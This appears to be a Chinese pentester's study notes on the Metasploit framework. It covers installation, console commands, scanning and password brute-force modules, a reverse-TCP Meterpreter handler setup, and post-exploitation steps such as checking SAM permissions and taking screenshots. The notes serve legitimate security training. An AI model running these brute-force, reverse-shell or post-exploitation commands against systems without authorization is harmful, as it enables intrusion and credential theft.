# Metasploit
> 注 : 笔记中拓扑图 xmind 源文件在其图片目录下
---
## 免责声明
`本文档仅供学习和研究使用,请勿使用文中的技术源码用于非法用途,任何人造成的任何负面影响,与本人无关.`
---
**简介**
Metasploit 是一个漏洞框架,拥有超过 1700 个漏洞利用程序,大大简化了渗透测试的工作,同时具有模块化的体系结构，渗透测试人员可以很方便的添加或修改exploit.
**项目地址**
- https://github.com/rapid7/metasploit-framework
**文章 & Reference**
- [MSF基础命令新手指南](https://www.jianshu.com/p/77ffbfc3a06c)
- [[渗透神器系列]Metasploit](https://thief.one/2017/08/01/1/)
- [给kali的Metasploit下添加一个新的exploit](https://blog.csdn.net/SilverMagic/article/details/40978081)
- [linux - Metasploit: Module database cache not built yet, using slow search](https://serverfault.com/questions/761672/metasploit-module-database-cache-not-built-yet-using-slow-search)
- [Nightly Installers](https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers)
- [探寻Metasploit Payload模式背后的秘密](https://www.freebuf.com/articles/system/187312.html)
- [记一次PowerShell配合Metersploit的艰难提权](https://mp.weixin.qq.com/s/Y4rT3ECaSLNgr8KrG-xtTw)
**图形化 UI**
- [FunnyWolf/Viper](https://github.com/FunnyWolf/Viper) - 非常牛逼,推荐
- [WayzDev/Kage](https://github.com/WayzDev/Kage)
- [rsmudge/armitage](https://github.com/rsmudge/armitage)
---
## 安装及维护
**安装**
使用 Rapid7 的一套快速安装项目 metasploit-omnibus,可以实现一句话安装
```
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall
```
安装完成后位置 `/opt/metasploit-framework/embedded/framework/`
**框架组成**
Metasploit 主要包含了以下几个功能模块
- msfconsole：整个框架最基本的模块，所有的功能都可以该模块下运行。
- msfvenom：代替了 msfpayload 和 msfencode 的功能，效率更高。
- msfupdate：用于软件更新，更新漏洞库和利用代码。
- msfweb：Metasploit Framework 的 web 组件，支持多用户，是 Metasploit 图形化接口。
**目录结构**
```bash
modules
    - auxiliary     # 主要包含辅助性脚本(扫描、嗅探、注入、爆破，漏洞挖掘)
    - encoders      # 主要包含各种编码工具，以便绕过入侵检测和过滤系统
    - exploits      # 漏洞利用，包含主流的漏洞利用脚本，exp 命名规则:系统/服务/模块
    - nops          # 绕过针对溢出攻击滑行字符串的拦截检测
    - payloads      # 攻击荷载，主要在目标机器执行代码
    - post          # 此目录放着 msf 的 exploit 执行成功后，向目标发送的一些功能性指令，如提权，获取 hash 等
    - evasion       # 新增，用来生成免杀 payload，类似于集成 msfvenom 功能
data        # 存放 meterpreter ，passiveX，vnc，DLLs，等这些工具和一些用户接口代码，msfweb 和一些其他模块用到的数据文件
plugins     # 这里的模块用户需要 load 来加载，提供数据库连接插件和各种要用到的插件
scripts     # 这个目录下的文件大都是 meterpreter 这个模块利用的脚本，比如用到 migrate 来转移到其他进程的指令的源代码就在此
tools       # 包含一些有用的脚本和零散的工具
```
**启动**
```bash
msfconsole          # 运行
msfdb init          # 初始化数据库
db_rebuild_cache    # 重建缓存
db_status           # 查看数据库连接情况
```
**更新**
对于 kali 自带的 msf 可以使用 apt 更新
```bash
apt-get update
apt-get install -y metasploit-framework
```
嫌官方源速度慢可以添加阿里云的源
```vim
vim /etc/apt/sources.list
deb http://mirrors.aliyun.com/kali kali-experimental main non-free contrib
deb-src http://mirrors.aliyun.com/kali kali-experimental main non-free contrib
```
也可以直接使用 `msfupdate`
**Module database cache not built yet, using slow search**
> 注: 5.0.0 之后就不需要这个了
```bash
service postgresql start
msfdb init
db_rebuild_cache
```
**添加一个新的 exploit**
1. 在 `/usr/share/metasploit-framework/modules/exploits/` 目录下新建一个自定义文件夹 aaatest,将 rb 脚本扔进去
2. 启动 metasploit
3. 输入 reload_all 重新加载所有模块
4. use exploit/aaatest/exp(输入的时候可以用 tab 补全,如果不能补全说明就有问题)
**msfvenom**
使用 msfvenom 生成 payload 内容见 [权限维持](../RedTeam/后渗透/权限维持.md#msfvenom)
---
## 基本使用
**启动**
```bash
msfconsole -a 		# 退出Metasploit前询问或接受“exit-y”
msfconsole -H 		# 历史文件文件将命令历史记录保存到指定文件
msfconsole -o 		# 将文件输出到指定文件
msfconsole -p 		# 插件插件在启动时加载插件
msfconsole -q 		# 安静不要在启动时打印横幅	（静默启动）
msfconsole -r 		# 资源文件执行指定的资源文件（-对于stdin）
msfconsole -x 		# execute command命令执行指定的控制台命令（用于多个）
msfconsole -h 		# 帮助显示此消息
msfconsole -v 		# 显示版本信息
```
**启动后**
```bash
banner                          # 打印 banner
color ['true'|'false'|'auto']   # 切换颜色显示
back                            # 返回
use                             # 指定模块
info                            # 查看模块信息
sessions                        # 查看会话
jobs                            # 显示当前运行进程
kill                            # 结束进程
reload_all                      # 重新加载所有模块
search                          # 搜索模块
version                         # 显示当前版本
show exploits 			        # 查看所有可用的渗透攻击程序代码
show auxiliary 			        # 查看所有可用的辅助攻击工具
show options 			        # 查看该模块所有可用选项
show payloads 			        # 查看该模块适用的所有载荷代码
show targets 			        # 查看该模块适用的攻击目标类型
set                             # 设置一个特定的上下文变量的值
setg                            # 设置一个全局变量的值
threads                         # 查看和操作后台线程
unset                           # 取消设置一个或多个特定的上下文变量
unsetg                          # 取消设置一个或多个全局变量的
```
---
## 常用模块
**信息收集**
利用 auxiliary 这个模块来获取目标网端的信息,包括端口开放情况、主机存活情况.
```bash
use auxiliary/scanner/discovery/arp_sweep       # arp 扫描
use auxiliary/scancer/smb/smb_version           # 存活的 445 主机
use auxiliary/scanner/portscan/syn              # 端口扫描
use auxiliary/scanner/portscan/tcp              # TCP 端口扫描
use auxiliary/scanner/telnet/telnet_version     # telent 服务扫描
use auxiliary/scanner/rdp/rdp_scanner           # 远程桌面服务扫描
use auxiliary/scanner/ssh/ssh_version           # ssh 主机扫描
use auxiliary/scanner/smb/smb_version           # smb 服务扫描
use auxiliary/scanner/ip/ipidseq                # IPID 序列扫描器
use auxiliary/scanner/mssql/mssql_ping          # mssql
use auxiliary/scanner/http/webdav_scanner       # webdav
```
**爆破**
```bash
use auxiliary/scanner/mysql/mysql_login         # 爆破 mysql
use auxiliary/scanner/mssql/mssql_login         # 爆破 mssql
use auxiliary/scanner/ssh/ssh_login             # 爆破 SSH
use auxiliary/scanner/snmp/snmp_enum            # 枚举 snmp
use auxiliary/scanner/vnc/vnc_login             # 爆破 VNC
use auxiliary/scanner/http/tomcat_mgr_login     # 爆破 tomcat
```
---
## meterpreter
Meterpreter 属于 stage payload，在 Metasploit Framework 中，Meterpreter 是一种后渗透工具，它属于一种在运行过程中可通过网络进行功能扩展的动态可扩展型 Payload。这种工具是基于 “内存 DLL 注入” 理念实现的，它能够通过创建一个新进程并调用注入的 DLL 来让目标系统运行注入的 DLL 文件。
首先目标先要执行初始的溢出漏洞会话连接，可能是 bind 正向连接，或者反弹 reverse 连接。反射连接的时候加载 dll 链接文件，同时后台悄悄处理 dll 文件。其次 Meterpreter 核心代码初始化, 通过 socket 套接字建立一个 TLS 加密隧道并发送 GET 请求给 Metasploit 服务端。Metasploit 服务端收到这个 GET 请求后就配置相应客户端。最后，Meterpreter 加载扩展，所有的扩展被加载都通过 TLS 进行数据传输。
### Tips
可以将攻击代码写入 configure.rc（只要是以 .rc 结尾的文件）配置文件中，然后使用命令
```bash
msfconsole -r configure.rc
```
进行自动攻击
---
### 获取会话
**handler**
```bash
use exploit/multi/handler
set payload windows/x64/meterpreter_reverse_tcp
set lhost [lhost]
set lport [lport]
exploit -j  # 后台执行
```
**cmdshell 升级为 meterpreter**
如果最开始获取的是 cmdshell,后来发现这台机器非常适合作为测试其它终端的跳板,这个时候 cmdshell 的功能已经不能满足需要,升级成 meterpreter 就十分有必要.`sessions -u "id"` 将该 cmdshell 升级成 meterpreter
**注意事项**
如果 meterpreter session 创建成功了,但很快就断连,此时应该修改使用的 payload,优先改成 generic/shell_reverse_tcp 等
如果还不成功,切换回连端口或者改成 bind shell 试试
---
### 信息收集
**查看权限**
```bash
getuid          # 查看当前用户
load powershell
powershell_shell
PS > Get-Acl -Path HKLM:\SAM\SAM | Format-List          # 查看 Users 或 Everyone 是否有 SAM 注册表项的读取权限
```
**截屏**
```bash
use espia
screenshot
screengrab
```